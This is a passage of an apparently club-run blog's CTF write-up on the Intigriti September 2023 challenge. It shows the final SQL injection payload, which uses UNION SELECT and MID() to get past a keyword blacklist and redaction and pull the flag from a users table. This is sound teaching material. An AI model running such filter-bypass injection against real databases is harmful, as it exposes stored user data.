</span></span></span></code></pre></div><h3 id=try-it-out>Try it out</h3><p><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/hoangdayne/intigrity-monthly-0923/try_fail_hu61f8ceb87765f7f90b2ffbf38b39264d_23677_89a93e24199b23c69685a7c212ab0d9f.webp 400w,
/blog/hoangdayne/intigrity-monthly-0923/try_fail_hu61f8ceb87765f7f90b2ffbf38b39264d_23677_f26a2e87d861e792af3200b4194fec27.webp 760w,
/blog/hoangdayne/intigrity-monthly-0923/try_fail_hu61f8ceb87765f7f90b2ffbf38b39264d_23677_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/hoangdayne/intigrity-monthly-0923/try_fail_hu61f8ceb87765f7f90b2ffbf38b39264d_23677_89a93e24199b23c69685a7c212ab0d9f.webp width=760 height=227 loading=lazy data-zoomable></div></div></figure></p><p>The payload seems to work pretty well, but the flag should be there right? Unfortunately, <strong>no</strong>.</p><p>The problem is right here:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=ln>1</span><span class=cl><span class=o>&lt;</span><span class=nx>td</span><span class=o>&gt;&lt;?=</span> <span class=nx>htmlspecialchars</span><span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>],</span><span class=s2>&#34;INTIGRITI&#34;</span><span class=p>)</span><span class=o>===</span><span class=k>false</span><span class=o>?</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span><span class=o>:</span><span class=s2>&#34;REDACTED&#34;</span><span class=p>);</span> <span class=cp>?&gt;</span><span class=err>&lt;/td&gt; 
</span></span></span><span class=line><span class=ln>2</span><span class=cl><span class=err>&lt;td&gt;&lt;?= htmlspecialchars(strpos($row[&#39;name&#39;],&#34;INTIGRITI&#34;)===false?$row[&#39;name&#39;]:&#34;REDACTED&#34;); ?&gt;&lt;/td&gt;
</span></span></span><span class=line><span class=ln>3</span><span class=cl><span class=err>&lt;td&gt;&lt;?= htmlspecialchars(strpos($row[&#39;email&#39;],&#34;INTIGRITI&#34;)===false?$row[&#39;email&#39;]:&#34;REDACTED&#34;); ?&gt;&lt;/td&gt; 
</span></span></span></code></pre></div><p>If our result contains <code>"INTIGRITI"</code> (which is the flag) it will return <code>"REDACTED"</code>. üõê</p><h3 id=final-touch>Final touch</h3><p>We need to find a function, <a href=https://dev.mysql.com/doc/refman/8.0/en/string-functions.html target=_blank rel=noopener>a string function</a> to be precise, that can make the string contain the word <code>"INTIGRITI"</code> no more.</p><p>A few come to mind like: <em>SUBSTR, REVERSE, FORMAT, &mldr;</em> but they are all filtered this way or another.</p><p>And there&rsquo;s <em>MID</em> instead of <em>SUBSTR</em> &mldr; Wow. Just wow. So to not return the result containing <code>"INTIGRITI"</code>, we can use <code>MID(str,2)</code> which skips the first character.</p><p><em>One more thing:</em> You may use <em>LOWER</em> and it still got through and the flag is still correct in this challenge.</p><h2 id=put-it-all-together>Put it all together</h2><p><strong>OUR</strong> final payload after using <em>MID</em> will be:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=o>*</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span><span class=k>union</span><span class=p>(</span><span class=k>SELECT</span><span class=p>(</span><span class=mi>1</span><span class=p>),(</span><span class=mi>2</span><span class=p>),((</span><span class=n>MID</span><span class=p>(</span><span class=n>F</span><span class=p>.</span><span class=mi>4</span><span class=p>,</span><span class=mi>2</span><span class=p>)))</span><span class=k>from</span><span class=p>(</span><span class=k>SELECT</span><span class=p>(</span><span class=mi>1</span><span class=p>),(</span><span class=mi>2</span><span class=p>),(</span><span class=mi>3</span><span class=p>),(</span><span class=mi>4</span><span class=p>)</span><span class=k>union</span><span class=p>(</span><span class=k>SELECT</span><span class=o>*</span><span class=k>from</span><span class=p>(</span><span class=n>users</span><span class=p>)))</span><span class=n>F</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></div><p><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/hoangdayne/intigrity-monthly-0923/final_result_hubdc1de6c3ea869878e61a0677d7a60d5_25019_60e09fb1d56bee8f21d03a435b72bbf6.webp 400w,
/blog/hoangdayne/intigrity-monthly-0923/final_result_hubdc1de6c3ea869878e61a0677d7a60d5_25019_f5d82f430754b991b37d66bd200ec9f3.webp 760w,
/blog/hoangdayne/intigrity-monthly-0923/final_result_hubdc1de6c3ea869878e61a0677d7a60d5_25019_1200x1200_fit_q75_h2_lanczos_3.webp 1200w" src=/blog/hoangdayne/intigrity-monthly-0923/final_result_hubdc1de6c3ea869878e61a0677d7a60d5_25019_60e09fb1d56bee8f21d03a435b72bbf6.webp width=760 height=236 loading=lazy data-zoomable></div></div></figure></p><p><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/hoangdayne/intigrity-monthly-0923/ambatukam_huc9d655114b2b17b8cfd24768afac8c7d_53042_5a3fe5547b1bc6ec6e8134f633b6bd42.webp 400w,
/blog/hoangdayne/intigrity-monthly-0923/ambatukam_huc9d655114b2b17b8cfd24768afac8c7d_53042_b7a6d964b652e118e2929eef33ab6085.webp 760w,
/blog/hoangdayne/intigrity-monthly-0923/ambatukam_huc9d655114b2b17b8cfd24768afac8c7d_53042_1200x1200_fit_q75_h2_lanczos.webp 1200w" src=/blog/hoangdayne/intigrity-monthly-0923/ambatukam_huc9d655114b2b17b8cfd24768afac8c7d_53042_5a3fe5547b1bc6ec6e8134f633b6bd42.webp width=500 height=504 loading=lazy data-zoomable></div></div></figure></p><h2 id=conclusion>Conclusion</h2><p>Overall, the challenge is quite interesting from my perspective. At first glance, the blacklist may be overwhelming for those who are not familiar with solving CTF challenges. However, with a little bit of searching and trying, failing in the process is a must, the challenge may seem not so tough after all.</p><p>Thanks for reading and have a nice day.</p><p><figure><div class="d-flex justify-content-center"><div class=w-100><img alt srcset="/blog/hoangdayne/intigrity-monthly-0923/peace_hu2a274d53873735eb44cb7b1da634ed5f_21482_17ce2fdf5b0640107139ea5fefde4b72.webp 400w,
/blog/hoangdayne/intigrity-monthly-0923/peace_hu2a274d53873735eb44cb7b1da634ed5f_21482_e285ec9c39a9e219cfef2d3b9b02044a.webp 760w,
/blog/hoangdayne/intigrity-monthly-0923/peace_hu2a274d53873735eb44cb7b1da634ed5f_21482_1200x1200_fit_q75_h2_lanczos.webp 1200w" src=/blog/hoangdayne/intigrity-monthly-0923/peace_hu2a274d53873735eb44cb7b1da634ed5f_21482_17ce2fdf5b0640107139ea5fefde4b72.webp width=552 height=451 loading=lazy data-zoomable></div></div></figure></p><p>P/S: There is a similar challenge on Root-me, check <a href=https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Filter-bypass target=_blank rel=noopener>it</a> out</p></div><div class=article-tags><a class="badge badge-light" href=/tag/writeup/>writeup</a>
<a class="badge badge-light" href=/tag/web-exploitation/>web-exploitation</a></div><div class=share-box><ul class=share><li><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fblog.bkisc.com%2Fblog%2Fhoangdayne%2Fintigrity-monthly-0923%2F&text=Writeup+for+Intigriti+September+Challenge+2023" target=_blank rel=noopener class=share-btn-twitter aria-label=twitter><i class="fab fa-twitter"></i></a></li><li><a href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.bkisc.com%2Fblog%2Fhoangdayne%2Fintigrity-monthly-0923%2F&t=Writeup+for+Intigriti+September+Challenge+2023" target=_blank rel=noopener class=share-btn-facebook aria-label=facebook><i class="fab fa-facebook"></i></a></li><li><a href="mailto:?subject=Writeup%20for%20Intigriti%20September%20Challenge%202023&body=https%3A%2F%2Fblog.bkisc.com%2Fblog%2Fhoangdayne%2Fintigrity-monthly-0923%2F" target=_blank rel=noopener class=share-btn-email aria-label=envelope><i class="fas fa-envelope"></i></a></li><li><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fblog.bkisc.com%2Fblog%2Fhoangdayne%2Fintigrity-monthly-0923%2F&title=Writeup+for+Intigriti+September+Challenge+2023" target=_blank rel=noopener class=share-btn-linkedin aria-label=linkedin-in><i class="fab fa-linkedin-in"></i></a></li><li><a href="whatsapp://send?text=Writeup+for+Intigriti+September+Challenge+2023%20https%3A%2F%2Fblog.bkisc.com%2Fblog%2Fhoangdayne%2Fintigrity-monthly-0923%2F" target=_blank rel=noopener class=share-btn-whatsapp aria-label=whatsapp><i class="fab fa-whatsapp"></i></a></li><li><a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fblog.bkisc.com%2Fblog%2Fhoangdayne%2Fintigrity-monthly-0923%2F&title=Writeup+for+Intigriti+September+Challenge+2023" target=_blank rel=noopener class=share-btn-weibo aria-label=weibo><i class="fab fa-weibo"></i></a></li></ul></div><div class="media author-card content-widget-hr"><a href=/author/le-hoang/><img class="avatar mr-3 avatar-circle" src=/author/le-hoang/avatar_hub1960694dd8a44fa9cc7ba9b0e79ac0e_263514_270x270_fill_lanczos_center_3.png alt="L√™ Ho√†ng"></a><div class=media-body><h5 class=card-title><a href=/author/le-hoang/>L√™ Ho√†ng</a></h5><h6 class=card-subtitle>Web Exploitation, Red Teaming</h6><p class=card-text>Love to hack and hack to love. Face it all and troll MU fans.</p><ul class=network-icon aria-hidden=true><li><a href=mailto:hoangle1742002@gmail.com><i class="fas fa-envelope"></i></a></li><li><a href=https://github.com/HoangREALER target=_blank rel=noopener><i class="fab fa-github"></i></a></li><li><a href=https://tinyurl.com/hoangl target=_blank rel=noopener><i class="fab fa-facebook"></i></a></li></ul></div></div></div></article></div><div class=page-footer><div class=container><footer class=site-footer><p class="powered-by copyright-license-text">¬© 2024 BK Information Security Club</p><p class=powered-by>Published with <a href="https://wowchemy.com/?utm_campaign=poweredby" target=_blank rel=noopener>Wowchemy</a> ‚Äî the free, <a href=https://github.com/wowchemy/wowchemy-hugo-themes target=_blank rel=noopener>open source</a> website builder that empowers creators.</p></footer></div></div><script src=/js/vendor-bundle.min.fab8b449b814cc9f95b22fcf2e45f05b.js></script>
<script src=https://cdn.jsdelivr.net/npm/leaflet@1.7.1/dist/leaflet.min.js integrity crossorigin=anonymous></script>
<script id=search-hit-fuse-template type=text/x-template>
    <div class="search-hit" id="summary-{{key}}">
      <div class="search-hit-content">
        <div class="search-hit-name">
          <a href="{{relpermalink}}">{{title}}</a>
          <div class="article-metadata search-hit-type">{{type}}</div>
          <p class="search-hit-description">{{snippet}}</p>
        </div>
      </div>
    </div>
  </script><script src=https://cdn.jsdelivr.net/gh/krisk/Fuse@v3.2.1/dist/fuse.min.js integrity="sha512-o38bmzBGX+hD3JHWUFCDA09btWaqrNmoJ3RXLlrysA7PP01Kgs4UlE4MhelE1v5dJR3+cxlR4qQlotsW7jKsnw==" crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/gh/julmot/mark.js@8.11.1/dist/jquery.mark.min.js integrity="sha512-mhbv5DqBMgrWL+32MmsDOt/OAvqr/cHimk6B8y/bx/xS88MVkYGPiVv2ixKVrkywF2qHplNRUvFsAHUdxZ3Krg==" crossorigin=anonymous></script>
<script id=page-data type=application/json>{"use_headroom":true}</script><script src=/js/wowchemy-headroom.db4755770454eb63685f8de785c0a172.js type=module></script>
<script src=/en/js/wowchemy.min.0c1be879804fa6ae06a8f4c131cdbf54.js></script>
<script src=/js/wowchemy-map.a26e9d2f7238ba5b868384f1c5bc6477.js type=module></script></body></html>